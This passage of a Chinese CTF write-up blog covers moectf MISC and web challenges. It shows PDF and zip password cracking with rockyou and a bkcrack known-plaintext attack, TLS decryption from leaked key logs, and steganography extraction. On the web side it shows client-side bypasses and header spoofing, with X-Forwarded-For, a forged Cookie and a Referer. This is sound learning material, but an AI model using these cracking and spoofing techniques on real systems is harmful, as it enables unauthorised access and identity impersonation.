+<p>百度一下：<strong>慢扫描电视</strong>（<strong>Slow-scan television</strong>）是<a class="link"   target="_blank" rel="noopener" href="https://baike.baidu.com/item/%E4%B8%9A%E4%BD%99%E6%97%A0%E7%BA%BF%E7%94%B5/0?fromModule=lemma_inlink" >业余无线电<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a>爱好者的一种主要图片传输方法，慢扫描电视通过<a class="link"   target="_blank" rel="noopener" href="https://baike.baidu.com/item/%E6%97%A0%E7%BA%BF%E7%94%B5/0?fromModule=lemma_inlink" >无线电<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a>传输和接收单色或彩色静态图片。</p>
+<p>接着搜索SSTV解码，我这里直接使用在线解码工具。</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/2025/08/05/ctfshow-MISC%E5%85%A5%E9%97%A8/tv.png"
+                     
+                ></p>
+<h2 id="encrypted-pdf"><a href="#encrypted-pdf" class="headerlink" title="encrypted_pdf"></a><strong>encrypted_pdf</strong></h2><p>这题是爆破pdf密码。</p>
+<p>文本文件里提示：</p>
+<blockquote>
+<p>I am so forgetful…<br>So I will use a password that is simple enough.</p>
+</blockquote>
+<p>密码很简单。</p>
+<p>我便用pdfcrack进行爆破，但不知道对应字段，感觉很费时间，于是放弃。</p>
+<p>接着，改用kali自带的rockyou 字典进行爆破，最后得到密码。</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/2025/08/05/ctfshow-MISC%E5%85%A5%E9%97%A8/crypto1.png"
+                     
+                ></p>
+<blockquote>
+<p>qwe123是一个弱密码</p>
+</blockquote>
+<p>接着打开pdf，便有flag了</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/2025/08/05/ctfshow-MISC%E5%85%A5%E9%97%A8/crypto2.png"
+                     
+                ></p>
+<h2 id="捂住一只耳"><a href="#捂住一只耳" class="headerlink" title="捂住一只耳"></a>捂住一只耳</h2><p>结合题目，应该某一声道有内容，直接丢进Audacity。</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/2025/08/05/ctfshow-MISC%E5%85%A5%E9%97%A8/zhuyizhier.png"
+                     
+                ></p>
+<p>上面有异常，且是一长一短，盲猜摩斯密码。使用在线解码网站解码即可。</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/2025/08/05/ctfshow-MISC%E5%85%A5%E9%97%A8/zhuyizhier2.png"
+                     
+                ></p>
+<h2 id="Enchantment"><a href="#Enchantment" class="headerlink" title="Enchantment"></a>Enchantment</h2><p>流量分析题，还没做过，尝试一下，边学边做吧。🙂</p>
+<p>使用wireshark，找到png图片的包。</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/2025/08/05/ctfshow-MISC%E5%85%A5%E9%97%A8/chantment2.png"
+                     
+                ></p>
+<p>然后获取图片。</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/2025/08/05/ctfshow-MISC%E5%85%A5%E9%97%A8/chantment.png"
+                     
+                ></p>
+<p>然后搜索附魔台文字相关进行翻译。</p>
+<blockquote>
+<p>the flag is below<br>now you have<br>mastered enchanting</p>
+</blockquote>
+<h2 id="ez-ssl"><a href="#ez-ssl" class="headerlink" title="ez_ssl"></a>ez_ssl</h2><p>根据题目提示进行查阅：</p>
+<blockquote>
+<p>SSL（Secure Socket Layer）安全套接层是Netscape公司率先采用的网络安全协议。它是在传输<a class="link"   target="_blank" rel="noopener" href="https://baike.baidu.com/item/%E9%80%9A%E4%BF%A1%E5%8D%8F%E8%AE%AE/3351624?fromModule=lemma_inlink" >通信协议<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a>（TCP&#x2F;IP）上实现的一种安全协议，采用<a class="link"   target="_blank" rel="noopener" href="https://baike.baidu.com/item/%E5%85%AC%E5%BC%80%E5%AF%86%E9%92%A5/7453570?fromModule=lemma_inlink" >公开密钥<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a>技术。SSL广泛支持各种类型的网络，同时提供三种基本的安全服务，它们都使用公开密钥技术。</p>
+</blockquote>
+<p>那么我们便知道，流量数据是被加密过的。</p>
+<p>查看流量包，右侧可见ssl.log字样。</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/2025/08/05/ctfshow-MISC%E5%85%A5%E9%97%A8/_ssl1.png"
+                     
+                ></p>
+<p>下方发现一些可疑数据</p>
+<blockquote>
+<p>CLIENT_RANDOM 5cc9d58e7bf72668c8c7ca13915b43530206bc57523a3dc06420f47291081bf70 3318cf82ad502316bfa204be096be19f297b0e5f680d81e462c39d0af53ab67b82d0e11b54db16dae81394cd9e9816e4<br>CLIENT_RANDOM 523878d7689e894823485b8f32727c779f8605866423eab6f4cc16c9df1cfb33 3318cf82ad502316bfa204be096be19f297b0e5f680d81e462c39d0af53ab67b82d0e11b54db16dae81394cd9e9816e4<br>CLIENT_RANDOM ccfba4dd12e374afd300f296b691e12b70f9d5f8be0458782887763c8a54626e 3318cf82ad502316bfa204be096be19f297b0e5f680d81e462c39d0af53ab67b82d0e11b54db16dae81394cd9e9816e4<br>CLIENT_RANDOM c8e817f2efcee3be9290aa075919f50f329be997b124487d02a1850e48c4292d 3318cf82ad502316bfa204be096be19f297b0e5f680d81e462c39d0af53ab67b82d0e11b54db16dae81394cd9e9816e4</p>
+</blockquote>
+<p>应该是泄露的密钥，接着进行密钥导入。</p>
+<p>点击“编辑“，再选择”首选项“，选择”protocols“，找到”TLS“,</p>
+<p>打开wireshark，选择“编辑“，找到”首选项“,在(Pre)-Master-Secret-Log filename进行导入。然后我们便能看到，多了几个流量包。并发现了疑似zip文件，如下图</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/2025/08/05/ctfshow-MISC%E5%85%A5%E9%97%A8/_ssl2.png"
+                     
+                ></p>
+<p>提取出来，然后发现打不开，放到编辑器里面去，发现有真加密。</p>
+<p>ZIP 文件结构最后有个 <strong>End of Central Directory (EOCD)</strong> 记录，其中有一个字段 ’comment‘，出题人常常在这里写提示信息。</p>
+<blockquote>
+<p>E5 AF 86 E7 A0 81 E4 B8 BA 37 E4 BD 8D E7 BA AF E6 95 B0 E5 AD 97</p>
+</blockquote>
+<p>16进制转utf8得到：</p>
+<blockquote>
+<p>密码为7位纯数字</p>
+</blockquote>
+<p>并且在尝试解压的过程中，也会有相应信息告诉我们密码是七位数字，如下所示：</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/2025/08/05/ctfshow-MISC%E5%85%A5%E9%97%A8/_ssl4.png"
+                     
+                ></p>
+<p>接着进行爆破：</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/2025/08/05/ctfshow-MISC%E5%85%A5%E9%97%A8/_ssl3.png"
+                     
+                ></p>
+<p>得到密码：6921682 </p>
+<p>然后将zip文件丢进kali进行解压。</p>
+<div class="code-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">unzip -P 6921682 flag.zip</span><br></pre></td></tr></table></figure></div>
+
+<p>发现解压不了。经查阅是压缩算法问题，于是改用7z解压</p>
+<div class="code-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">7z x flag3.zip -p6921682</span><br></pre></td></tr></table></figure></div>
+
+<p>得到相应文件</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/2025/08/05/ctfshow-MISC%E5%85%A5%E9%97%A8/_ssl5.png"
+                     
+                ></p>
+<p>最后进行Ook!解密即可获得flag。</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/2025/08/05/ctfshow-MISC%E5%85%A5%E9%97%A8/l6.png"
+                     
+                ></p>
+<h2 id="WebRepo"><a href="#WebRepo" class="headerlink" title="WebRepo"></a>WebRepo</h2><p>题目给了一个WebRepo.webp，这个格式在线识别网站时识别不了的，遂用在线网站转换文件格式再识别，得到如下：</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/2025/08/05/ctfshow-MISC%E5%85%A5%E9%97%A8/brepo1.png"
+                     
+                ></p>
+<p>ok，那就用binwalk看一下，发现有一个7z压缩包，将它提取出来并解压获得一个.git文件，</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/2025/08/05/ctfshow-MISC%E5%85%A5%E9%97%A8/brepo2.png"
+                     
+                ></p>
+<p>接着如下找到flag相关内容：</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/2025/08/05/ctfshow-MISC%E5%85%A5%E9%97%A8/brepo4.png"
+                     
+                ></p>
+<p>接着执行：</p>
+<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git cat-file -p 03f7841506c9eec4690ba0de326f657732fcb5bc</span><br></pre></td></tr></table></figure></div>
+
+<p>获得flag:moectf{B1NwA1K_ANd_g1t_R3seT-MaG1C}</p>
+<h2 id="ez-png"><a href="#ez-png" class="headerlink" title="ez_png"></a>ez_png</h2><p>题目提示：某些数据段的长短似乎不太协调。pngcheck一下：</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/2025/08/05/ctfshow-MISC%E5%85%A5%E9%97%A8/_png.png"
+                     
+                ></p>
+<p>发现多个IDAT数据块，且有长度异常，在这里我尝试了许久，删除部分数据块，并不能爆出flag。emmm那就zsteg一下，结果发现有额外的数据存在。</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/2025/08/05/ctfshow-MISC%E5%85%A5%E9%97%A8/_png2.png"
+                     
+                ></p>
+<div class="code-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">zsteg -e extradata:0 ez_png.png &gt; flag.txt</span><br></pre></td></tr></table></figure></div>
+
+<p>提取出来，查看提取出的flag.txt文件，并分离。最终得到flag。</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/2025/08/05/ctfshow-MISC%E5%85%A5%E9%97%A8/_png3.png"
+                     
+                ></p>
+<h2 id="万里挑一"><a href="#万里挑一" class="headerlink" title="万里挑一"></a>万里挑一</h2><blockquote>
+<p>这题也是搞了好久终于搞定了。</p>
+</blockquote>
+<p>首先是一个压缩包套娃。通过脚本将密码写入字典</p>
+<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> zipfile, io, re</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">collect_passwords</span>(<span class="params">zip_bytes, depth=<span class="number">0</span>, pwlist=<span class="literal">None</span></span>):</span><br><span class="line">    <span class="keyword">with</span> zipfile.ZipFile(io.BytesIO(zip_bytes)) <span class="keyword">as</span> zf:</span><br><span class="line">        <span class="keyword">for</span> name <span class="keyword">in</span> zf.namelist():</span><br><span class="line">            data = zf.read(name)</span><br><span class="line"></span><br><span class="line">            <span class="comment"># 如果是 zip 文件且未达到深度限制，递归处理</span></span><br><span class="line">            <span class="keyword">if</span> name.endswith(<span class="string">&quot;.zip&quot;</span>) <span class="keyword">and</span> depth &lt; <span class="number">3</span>:</span><br><span class="line">                collect_passwords(data, depth+<span class="number">1</span>, pwlist)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="keyword">try</span>:</span><br><span class="line">                    text = data.decode(<span class="string">&quot;utf-8&quot;</span>, errors=<span class="string">&quot;ignore&quot;</span>)</span><br><span class="line">                    <span class="keyword">if</span> text:</span><br><span class="line">                        <span class="comment"># 查找所有小写字母和数字组合的20位字符串</span></span><br><span class="line">                        matches = re.findall(<span class="string">r&#x27;[a-z0-9]&#123;20&#125;&#x27;</span>, text)</span><br><span class="line">                        <span class="keyword">for</span> m <span class="keyword">in</span> matches:</span><br><span class="line">                            pwlist.add(m)</span><br><span class="line">                <span class="keyword">except</span>:</span><br><span class="line">                    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;password.zip&quot;</span>, <span class="string">&quot;rb&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        root = f.read()</span><br><span class="line"></span><br><span class="line">    pwset = <span class="built_in">set</span>()</span><br><span class="line">    collect_passwords(root, pwlist=pwset)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;passwords.txt&quot;</span>, <span class="string">&quot;w&quot;</span>, encoding=<span class="string">&quot;utf-8&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        <span class="keyword">for</span> pw <span class="keyword">in</span> pwset:</span><br><span class="line">            f.write(pw + <span class="string">&quot;\n&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;\n[✔] 共提取 <span class="subst">&#123;<span class="built_in">len</span>(pwset)&#125;</span> 个密码，已保存到 passwords.txt&quot;</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
+
+<p>接着爆破即可得到lock.zip的密码</p>
+<blockquote>
+<p>后面这个部分真的磨了很久</p>
+</blockquote>
+<p>flag.zip中有两个文件flag.txt,和明文.exe,这里是明文攻击，于是我便去查找有关的题解，但是并没有已知明文文件（这里也是思维定势了）</p>
+<blockquote>
+<p>实际上我们只需要获得一定字节的明文就行了</p>
+</blockquote>
+<p>压缩包里有文件明文.exe,这是一个Windows可执行程序。</p>
+<p>EXE 文件开头必然是固定头（PE 文件头）：</p>
+<blockquote>
+<p>4D 5A 90 00 03 00 00 00 04 00 00 00 FF FF 00 00<br>B8 00 00 00 00 00 00 00 40 00 00 00 00 00 00 00</p>
+</blockquote>
+<p>这里我们可以提取出来作为已知明文</p>
+<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">printf</span> <span class="string">&quot;\x4D\x5A\x90\x00\x03\x00\x00\x00\x04\x00\x00\x00\xFF\xFF\x00\x00&quot;</span> &gt; known.bin</span><br></pre></td></tr></table></figure></div>
+
+<p>接着使用bkcrack</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/2025/08/05/ctfshow-MISC%E5%85%A5%E9%97%A8/%E6%8C%91%E4%B8%801.png"
+                     
+                ></p>
+<p>这里获得三个密钥</p>
+<p>然后运行如下即可获得flag：</p>
+<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./bkcrack -C ~/桌面/flag.zip -c flag.txt -k eec878a3 6808e48f 3aa41bd8 -d flag.txt.dec</span><br></pre></td></tr></table></figure></div>
+
+<p>moectf{Y0u_h4v3_cho5en_7h3_r1ght_z1pf1le!!uysdgfsad}</p>
+<h1 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h1><blockquote>
+<p>也是啥都不会边学边做吧。&#x2F;(ㄒoㄒ)&#x2F;~~</p>
+</blockquote>
+<h3 id="Web入门指北"><a href="#Web入门指北" class="headerlink" title="Web入门指北"></a>Web入门指北</h3><p>打开文本文件，全是字符，经查阅得知是<strong>JSFuck</strong>。</p>
+<blockquote>
+<p>一种仅使用 6 个字符（<code>[</code>, <code>]</code>, <code>(</code>, <code>)</code>, <code>!</code>, <code>+</code>）编写有效 JavaScript 代码的编码方式。它的原理是通过类型转换和 JavaScript 的弱类型特性，将字符拼凑成可执行的代码。</p>
+</blockquote>
+<p>控制台运行后即可得到flag。</p>
+<h3 id="第一章-神秘的手镯"><a href="#第一章-神秘的手镯" class="headerlink" title="第一章 神秘的手镯"></a>第一章 神秘的手镯</h3><p>控制台中输入以下：</p>
+<div class="code-container" data-rel="Javascript"><figure class="iseeu highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&#x27;passwordInput&#x27;</span>).<span class="property">value</span> = <span class="variable constant_">CORRECT_PASSWORD</span>;</span><br></pre></td></tr></table></figure></div>
+
+<p>即可绕过，获得flag。</p>
+<h3 id="第二章-初识金曦玄轨"><a href="#第二章-初识金曦玄轨" class="headerlink" title="第二章 初识金曦玄轨"></a>第二章 初识金曦玄轨</h3><p>抓包即可，查看响应包,能看到flag明文。如下图所示：</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/2025/08/05/ctfshow-MISC%E5%85%A5%E9%97%A8/%E9%87%91....png"
+                     
+                ></p>
+<h3 id="第三章-问剑石！篡天改命！"><a href="#第三章-问剑石！篡天改命！" class="headerlink" title="第三章 问剑石！篡天改命！"></a><strong>第三章 问剑石！篡天改命！</strong></h3><p>改包发包即可。</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/2025/08/05/ctfshow-MISC%E5%85%A5%E9%97%A8/%E7%AB%A02.png"
+                     
+                ></p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/2025/08/05/ctfshow-MISC%E5%85%A5%E9%97%A8/%E7%AB%A0%E9%97%AE%E5%89%91%E7%9F%B3.png"
+                     
+                ></p>
+<p>moectf{gEt_POSt_Tr@nSM1SSI0n_1S-4-gO0d-m3thOD!!l118}</p>
+<h3 id="第五章-打上门来！"><a href="#第五章-打上门来！" class="headerlink" title="第五章 打上门来！"></a><strong>第五章 打上门来！</strong></h3><p>查阅后知道是，路径遍历漏洞。</p>
+<p>经过一些基本尝试后得到flag</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/2025/08/05/ctfshow-MISC%E5%85%A5%E9%97%A8/%E6%89%93%E4%B8%8A%E9%97%A8%E6%9D%A5.png"
+                     
+                ></p>
+<h3 id="Moe笑传之猜猜爆"><a href="#Moe笑传之猜猜爆" class="headerlink" title="Moe笑传之猜猜爆"></a>Moe笑传之猜猜爆</h3><p>在控制台中输入：</p>
+<div class="code-container" data-rel="Javascript"><figure class="iseeu highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">randomNumber=<span class="number">1</span></span><br></pre></td></tr></table></figure></div>
+
+<p>选定随机数，输入“1”，即可获得flag。</p>
+<h3 id="第四章金曦破禁与七绝傀儡阵"><a href="#第四章金曦破禁与七绝傀儡阵" class="headerlink" title="第四章金曦破禁与七绝傀儡阵"></a>第四章<strong>金曦破禁与七绝傀儡阵</strong></h3><p>一步步来，改包放包即可。</p>
+<p>本人是个懒逼这里直接放出通关的解答：</p>
+<blockquote>
+<p>第一关：守门傀儡·磐石<br>一尊形如巨龟、背负厚重石甲的傀儡堵在通道入口，双目红光闪烁，散发着重如山岳的压迫感。其胸口核心处，一块玉板闪烁着微光，上书：”欲过此关，需诵真言，启吾心窍，示之以’秘钥’（xdsec）。”</p>
+<p>HDdss立刻取出破阵罗盘，神念沉入。傀儡周围，立刻浮现出清晰的金色玄轨流动。他”看”到，傀儡的核心禁制在等待一个特定的”玄轨真言”。结合玉板提示，”示之以秘钥”即需要将秘钥”xdsec”传递给傀儡。</p>
+<p>“真言起手式……应是’取’（GET）。”HDdss心中明悟，神念凝聚，通过罗盘构筑真言：</p>
+<p>GET &#x2F;?key&#x3D;xdsec HTTP&#x2F;1.1 Host: 磐石傀儡<br>关键：使用GET方法，将参数key&#x3D;xdsec附加在路径之后<br>真言发出！磐石傀儡核心光芒一闪，厚重的石甲缓缓移开，露出通道，一枚通关玉简悬浮而出。”第一关，过！”HDdss信心大增。</p>
+<p>第二关：织云傀儡·流风<br>通道尽头，一尊形似仙鹤、身披流云纹路的傀儡轻盈悬浮，双翼微振，带起道道锋利风刃。其核心玉板：”吾慕织云，欲争魁首。以汝真言，告之宗门：’织云阁&#x3D;第一’。”</p>
+<p>提示明确需要传递”织云阁&#x3D;第一”这个信息。HDdss再次驱动罗盘探查玄轨，发现此傀儡的禁制核心更倾向于接收”深藏”的真言本意（Body），而非显露于外的路径参数。且信息中包含中文！</p>
+<p>“需用’呈’（POST）之法，真言本意深藏，并以’转生符’（URL编码）化之！”HDdss迅速判断。他回忆K皇所授，意念凝聚，构筑真言：</p>
+<p>POST &#x2F;declare HTTP&#x2F;1.1 Host: 织云傀儡 Content-Type: application&#x2F;x-www-form-urlencoded %E7%BB%87%E4%BA%91%E9%98%81%3D%E7%AC%AC%E4%B8%80<br>关键：使用POST方法；设置Content-Type为表单编码；Body部分将”织云阁&#x3D;第一”进行URL编码：%E7%BB%87%E4%BA%91%E9%98%81&#x3D;织云阁，%3D&#x3D;&#x3D;，%E7%AC%AC%E4%B8%80&#x3D;第一<br>真言发出！织云傀儡发出一声清唳，周身风刃消散，流云纹路光芒流转，显得极为愉悦。第二枚玉简落下。</p>
+<p>第三关：溯源傀儡·匿影<br>此关傀儡形如鬼魅，身形飘忽不定，仿佛融入阴影。玉板提示：”非吾同源，难近吾身。唯’本地之灵’，方得信任。”</p>
+<p>“本地之灵？”HDdss皱眉。K皇曾提过”本我溯源”（X-Forwarded-For）敕令可伪装源头！此关之意，是要求真言必须看起来像是从”本地”（127.0.0.1）发出的！</p>
+<p>他立刻构筑真言，并在敕令（Headers）中加入关键伪装：</p>
+<p>GET &#x2F;trusted HTTP&#x2F;1.1 Host: 溯源傀儡 X-Forwarded-For: 127.0.0.1<br>关键：在Headers中添加X-Forwarded-For: 127.0.0.1，伪装请求来源为本地<br>真言发出！匿影傀儡身形一滞，仿佛确认了什么，缓缓退入阴影，让开通道。第三枚玉简浮现。</p>
+<p>第四关：器灵傀儡·辨微<br>一尊通体由精密水晶构成的傀儡，无数光点在体内流转，如同审视万物的眼睛。玉板：”吾识万灵，唯爱’萌物’。非’萌灵之器’，拒之门外。”</p>
+<p>“萌物？萌灵之器？”HDdss略一思索，想起K皇提过的”器灵之证”（User-Agent）。此关要求，必须使用特定的、被傀儡识别为”萌物”的浏览器（如moe browser）发出的请求！</p>
+<p>他驱动罗盘，模拟修改敕令：</p>
+<p>GET &#x2F;access HTTP&#x2F;1.1 Host: 器灵傀儡 User-Agent: moe browser<br>关键：修改User-Agent Header为moe browser，伪装成特定浏览器访问<br>真言发出！水晶傀儡体内光点欢快地跳跃，发出悦耳的叮咚声，让开道路。第四枚玉简入手。</p>
+<p>第五关：心印傀儡·窃玉<br>此关傀儡身着华服，面容模糊，手持一枚不断变幻的令牌。玉板：”吾持心印，变幻莫测。欲破此关，以’xt’之名，攻吾之隙！”</p>
+<p>“‘以xt之名’！”HDdss瞳孔一缩。这分明是暗示要窃取或冒充xt长老的身份印记！K皇所授的”心印之痕”（Cookie）正是关键！他需要找到xt长老在此傀儡禁制中留下的身份”Cookie”，并将其篡改为xt！</p>
+<p>他先用罗盘正常发出一个探查请求（GET &#x2F;），观察傀儡的回应（Response）。在回应的敕令（Headers）中，果然发现一行：<br>Set-Cookie: user&#x3D;HDdss; Path&#x3D;&#x2F;<br>这显然是傀儡根据他的核心弟子令牌临时赋予的身份印记（Cookie），当前用户是HDdss。</p>
+<p>“需要将后续请求中的这个user值，改为’xt’！”HDdss立刻构筑攻击真言：</p>
+<p>GET &#x2F;attack HTTP&#x2F;1.1 Host: 心印傀儡 Cookie: user&#x3D;xt<br>关键：在后续请求的Headers中，携带修改后的Cookie：user&#x3D;xt，冒充xt的身份<br>真言发出！心印傀儡手中的令牌瞬间定格，华服身影一阵扭曲模糊，发出不甘的嘶鸣，随即僵立不动。第五枚玉简落下。HDdss心中凛然，这”心印之痕”果然至关重要，可窃取身份，行僭越之事！</p>
+<p>第六关：前尘傀儡·引路<br>一尊背负巨大书简的傀儡，书简上无数光字流转。玉板：”无根之木，无源之水。汝从何来？需有’引路之证’。”</p>
+<p>“引路之证？从何而来？”HDdss立刻联想到”前尘引路”（Referer）敕令。此关要求，发出的真言必须包含”引路之证”，即标明这个请求是从哪个”前站”（页面&#x2F;URL）链接或跳转过来的！</p>
+<p>他推测，只有标明是从某个特定地方（比如第一关的入口）来的请求，才会被认可。他尝试构筑真言：</p>
+<p>GET &#x2F;pass HTTP&#x2F;1.1 Host: 前尘傀儡 Referer: http:&#x2F;&#x2F;磐石傀儡&#x2F;entry<br>关键：在Headers中添加Referer字段，指明请求来源是”磐石傀儡的入口”<br>真言发出！书简傀儡背上的光字停止流转，组合成一道光门。第六枚玉简从中飞出。</p>
+<p>第七关：逆转傀儡·归墟<br>最后一关，傀儡造型最为古朴，如同一个巨大的青铜鼎炉，炉口幽深，仿佛能吞噬一切。玉板只有一句晦涩真言：”阴阳逆乱，归墟可填。以’覆’代’取’，塑吾新生。”</p>
+<p>“‘覆’代’取’？”HDdss凝神思索。K皇所授方法中，”取”（GET）是获取，”呈”（POST）是提交，”覆”（PUT）则常用于更新或替换整个资源！此关之意，是要求使用不常用的”PUT”方法，去完成某种”覆盖”或”塑造”的操作！</p>
+<p>他驱动罗盘，仔细探查鼎炉傀儡的玄轨。发现其核心禁制对标准的GET&#x2F;POST真言毫无反应，仿佛在等待一种特定的、更具”覆盖性”的指令。</p>
+<p>“就是’覆’（PUT）！”HDdss下定决心，构筑真言：</p>
+<p>PUT &#x2F;rebirth HTTP&#x2F;1.1 Host: 逆转傀儡 Content-Type: text&#x2F;plain 新生！<br>关键：使用PUT方法；简单设置Content-Type；在Body中传递一个象征”新生”的信息<br>真言发出！青铜鼎炉剧烈震动，炉口幽光爆发，随即缓缓收敛平息，鼎身浮现出玄奥的符文。一枚比其他六枚更加璀璨、蕴含着丝丝空间波动的玉简缓缓升起。七绝傀儡阵，通关！</p>
+<p>HDdss长舒一口气，额角已见汗珠。连续七关，每一关都需要精准理解禁制意图，并运用对应的”金曦破禁真言”进行修改或构造，心神消耗巨大。但收获同样巨大！他对”玄轨真言”的结构、各敕令的妙用、以及不同方法（GET&#x2F;POST&#x2F;PUT）的差异，有了更深切、更实战化的理解，这远比枯坐听讲领悟深刻百倍！</p>
+<p>收起七枚玉简，尤其是那枚空间波动最强的第七关玉简，HDdss转身离开七绝傀儡阵。他知道，这枚玉简不仅是通关凭证，更可能指向下一个任务或机缘。手腕上，K皇的虚影悄然浮现，带着一丝嘉许：”孺子可教。金曦破禁，已得三分真味。然此术浩瀚，日后更需勤修不辍。这’归墟玉简’……或许与老夫所需之’引魂玉’线索有关。且回听竹小筑，细细参研。”</p>
+<p>流云峰上，竹影婆娑。HDdss的身影消失在通往听竹小筑的青石小径上，心中充满了对更高境界的渴望和对未知线索的期待。金曦破禁之术，将成为他在仙门立足、探寻K皇过往、乃至攀登更高峰的利器。而玄天剑宗的暗流，似乎也随着他在傀儡阵中的表现，开始悄然涌动。</p>
+</blockquote>
+<p>最后还要进行一步base64解码</p>
+<p>moectf{C0n6r47u14710n5_y0ur_h77P_l3v3l_15_r34lly_h19h!}</p>
+<h3 id="第六章-藏经禁制？玄机初探！"><a href="#第六章-藏经禁制？玄机初探！" class="headerlink" title="第六章 藏经禁制？玄机初探！"></a>第六章 藏经禁制？玄机初探！</h3><p>最最最基础的sql注入。</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/2025/08/05/ctfshow-MISC%E5%85%A5%E9%97%A8/b_week1_sql1.png"
+                     
+                ></p>
+<h3 id="第七章-灵蛛探穴与阴阳双生符"><a href="#第七章-灵蛛探穴与阴阳双生符" class="headerlink" title="第七章 灵蛛探穴与阴阳双生符"></a><strong>第七章 灵蛛探穴与阴阳双生符</strong></h3><p>考察robots协议，以及MD5碰撞。</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/2025/08/05/ctfshow-MISC%E5%85%A5%E9%97%A8/%E7%AB%A0.png"
+                     
+                ></p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/2025/08/05/ctfshow-MISC%E5%85%A5%E9%97%A8/%E5%BC%A02.png"
+                     
+                ></p>
+<p>以上代码需要两个条件：</p>
+<ol>
+<li>值不相等</li>
+<li>有相等的MD5哈希值</li>
+</ol>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/2025/08/05/ctfshow-MISC%E5%85%A5%E9%97%A8/%E7%AB%A03.png"
+                     
+                ></p>
